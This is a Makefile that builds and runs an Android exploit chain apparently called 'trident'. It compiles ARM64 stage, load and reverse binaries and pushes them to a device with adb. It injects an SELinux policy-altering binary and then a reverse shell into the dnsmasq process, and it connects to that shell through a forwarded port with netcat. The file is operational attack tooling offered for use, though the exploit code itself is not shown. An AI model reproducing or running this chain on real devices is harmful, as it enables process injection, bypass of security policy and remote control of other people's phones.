all: build-all

# compile the binaries
obj/local/arm64-v8a/reverse: 
	ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk APP_ABI=arm64-v8a reverse

obj/local/arm64-v8a/load: 
	ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk APP_ABI=arm64-v8a load

obj/local/arm64-v8a/stage:
	ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk APP_ABI=arm64-v8a stage

# pseudo instruction to perform stage, load and reverse stages.
build-all: obj/local/arm64-v8a/reverse obj/local/arm64-v8a/stage obj/local/arm64-v8a/load

# show the logs for the trident
log: 
	adb logcat | grep -a trident

# runs the exploit. build all, push all, then carry user through the ropes.
run: build-all
	adb push obj/local/arm64-v8a/load /data/local/tmp/load
	adb push obj/local/arm64-v8a/reverse /data/local/tmp/reverse
	adb push obj/local/arm64-v8a/stage /data/local/tmp/stage
	adb push sepolicy /data/local/tmp/sepolicy
	adb shell chmod 777 /data/local/tmp/reverse /data/local/tmp/stage /data/local/tmp/load
	adb shell /data/local/tmp/stage /data/local/tmp/load
	@echo "sepolicy injection binary loaded into dnsmasq. hit enter when completed."
	@read
	adb forward tcp:4040 tcp:4040
	adb shell /data/local/tmp/stage /data/local/tmp/reverse
	@echo "reverse shell binary loaded into dnsmasq. run 'make connect' when completed"

connect:
	@echo "here is your shell: "
	nc localhost 4040

clean:
	rm -rf obj
